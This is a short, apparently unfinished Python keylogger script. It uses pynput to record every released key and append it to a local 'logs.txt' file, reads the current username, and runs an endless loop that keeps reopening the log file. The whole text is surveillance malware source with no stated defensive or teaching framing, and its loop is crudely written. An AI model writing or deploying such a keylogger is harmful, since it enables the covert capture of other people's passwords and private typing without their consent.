from pynput import keyboard
import os, shutil, getpass

def on_release(key):
    f.write(str(key))

username = getpass.getuser()
listener=keyboard.Listener(on_release=on_release)
listener.start()

f = open("logs.txt","a")
while True:
    i = 0
    f = open("logs.txt","a")
